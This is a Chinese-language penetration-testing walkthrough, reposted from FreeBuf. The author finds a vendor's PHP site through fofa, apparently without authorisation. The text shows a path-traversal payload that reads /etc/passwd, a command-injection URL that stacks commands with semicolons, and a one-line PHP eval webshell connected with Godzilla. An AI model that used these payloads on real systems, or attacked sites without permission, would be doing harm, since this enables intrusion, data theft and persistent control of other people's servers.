> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9a38O-_8R12CJh0Ni4-cIw)

> 作者：爱吃火锅的提莫， 转载自 FreeBuf.COM

起因
--

最近看到一个漏洞，心血来潮突然想复现试一试，于是开始了 fofa 搜索资产之旅。意外发现资产归属的厂商的另外一个资产，看起来很好欺负，于是开始测试一番。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrqzibf6HUX8tb11csQL4YohFbYhaVCjWNv0uy6RTu8zqcWYlgVw66gXQ/640?wx_fmt=jpeg)

目录爆破
----

测试第一步，首先是信息搜集，这里简单扫了一下开放端口和服务，并没有发现什么有用的，这里不赘述。通过 Wappalyzer 插件，知晓了资产基本信息，嗯，是 php 站。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrNVoFbXA2pmakNl80JQ0JMLoST6erWp3lZy27BSpPHiaTTU6MDEcaN6w/640?wx_fmt=jpeg)

接下来根据资产和厂商的信息构建了一份字典，开始了经典的暴力破解，当然，结果也很经典，无果。于是又开始了经典的扫目录环节，这里选用的 dirsearch，非常好用。扫描不久便有了惊喜，存在几处可访问的路径。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrZZ2o832xeRU9TqsiaiawPn1lplHAPEadmqrqiaMu7O6zdz01zWXibYyFOw/640?wx_fmt=jpeg)

这里发现了可疑路径 / downloader.php，拼接访问一下看看, 发现还需要参数才能正常访问。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrXbcmnnO3qKibPDoRVCnzAYNAPuWetg1FEdeLW6611rxasxAbgdpbmgQ/640?wx_fmt=jpeg)

任意文件下载
------

遇到这种情况，当然是模糊测试啦。这个页面盲猜需要参数读取文件，当然，手熟的师傅一眼就看出来了。这里还是正常操作，fuzz 参数一下。打开 burpsuit，拦包，发送到测试器，打开参数测试字典，因为之前信息收集得知主机系统可能是 ubuntu，所以拼接一个../../../../../../../../etc/passwd，跑起来。![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrOcKV2xcxDQht8tT5QKZCT7ic1GwjzQXpYFIWFKTnrlcAQicgbcg5ibicFQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrPMyKzUXPE1bHwZibn4X8k7LclMNQZu5Nv5cK4BqUesRticl65gC7uOtw/640?wx_fmt=jpeg)

仅仅不到 10 秒钟，便有了结果，排除一个误报，一个任意文件下载漏洞便入手了。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrHBsibsiabaFshPxJ6nJkmibwKookcicESvUkw2exRUcgeibk4qTLvw8lHiaw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrXxxceR0Pte7KozRILwZUBcWcUuMDX5psYyr7KcJ7L9p0CGzeFuMmeQ/640?wx_fmt=jpeg)

代码审计
----

当然，到这里也并不满足，因为不知道内部的路径信息，只能先来个经典的我下我自己，于是便把 downloader.php 页面下载下来了。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfric4QpU9p6xlVwWUJc7oYcwJiazTticoCKFsSqoTeEKo1wb2e6aib7QjG0w/640?wx_fmt=jpeg)

既然有了这个页面的源代码，于是就审计一番，看看有什么其它可利用的信息，源代码内部可能存在其它物理路径，凭证信息等等，本质上就是再次信息收集。这里用 vscode 打开瞅一瞅，一眼便看到文件读取的触发点，写的真是简单又实在，追踪了一下参数，确实毫无过滤，怪不得如此顺利。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrBjAlSfibz0ZNlkrlAYJX4KQA8ic6rgdJ8370Ryxx0q49gRkVBXdSVVMw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrORbR51RckeWwmXdXl0bUk8kcwNh5p37jqAtA8MYfflYsPI3J4FY5vg/640?wx_fmt=jpeg)

命令注入
----

这时上下略看一眼，发现了页面中包含多个 system 函数进行数据处理，于是全局搜索了一下 system(, 定位一下位置，但是大多数 system 函数传入的参数都使用了 escapeshellcmd 函数进行了过滤，此时先审计未过滤的 system 函数。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrfxtN2EEnNGnNiar0NfyDY7f2wdAPIor4icZdIqiaK9PSVtUIMERgFQ4EQ/640?wx_fmt=jpeg)

对第一处 system 函数传入的参数进行追踪，发现传入的参数，都来自内部配置文件且参数经过 escapeshellcmd 函数过滤，外部无法操控，遂放弃。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrVBU6rk7yCmibXowXTj77ficmI5Mn17ZfSxyCVibjYp9oicKwibMbUibSwfMw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrqk2hs9389cYYRgTwzjjk06LUYNs3Ow0HqmnmCeibPalmLib1iaHREXD2w/640?wx_fmt=jpeg)

第二处 system 函数看了一眼直接放弃。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrTcsrJxe7YRVwQuQCK26rw9loS6ZFmMiahcg6icPsULEc3KMOEAJraQZQ/640?wx_fmt=jpeg)

第三处 system 函数在对 file 的后缀进行选择判断的分支处，可以看出如果 file 的后缀为. zip，则在此处执行，$cmd 参数的有一个明显的拼接且无任何过滤，默认条件下会直接进入第二处 if 判断的 else 部分执行，由此看出，如果 $site 参数如果能控制即可完成命令注入，传入的参数也只需要用；分隔堆叠绕过即可。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfruVpnvBI7Mb9USibLiaWA7TBFoReSvK6aIsR06bttxCqC1sWDzKZkIDIg/640?wx_fmt=jpeg)

这时直接在 url 中如此拼接参数? file=.zip&site=;cat /etc/passwd;, 尝试访问，成功！

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfrPdL6p8wE140eMSba6CYhyV94JUibWzqicAupMCmj8hyZGvibCZDkdjqTQ/640?wx_fmt=jpeg)

哥斯拉上线
-----

此时就比较简单了，直接命令执行 echo <?eval($_POST["pass"]);?>test.php 写入 webshell，哥斯拉链接测试，成功。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwURPKRiazUQ0SIvf2kIbPfribR9Rr8RTddzgvSdCqJcVcVzHIPvJickpgU2fKtRYTJGT7b7A7R2EvicQ/640?wx_fmt=jpeg)

结语
--

其实上文看起来一切都很顺利，但在整个过程中也进行了很多无用操作，这些都是无法避免的，渗透过程往往都是磕磕绊绊的。渗透的过程就是通过信息收集去发现漏洞，通过漏洞再获取更多信息从而进入更深度的渗透过程从而达到目的。这样一次从目录爆破到命令的注入的过程整体上来说是简单清晰的，希望能给予各位师傅一点思路和经验。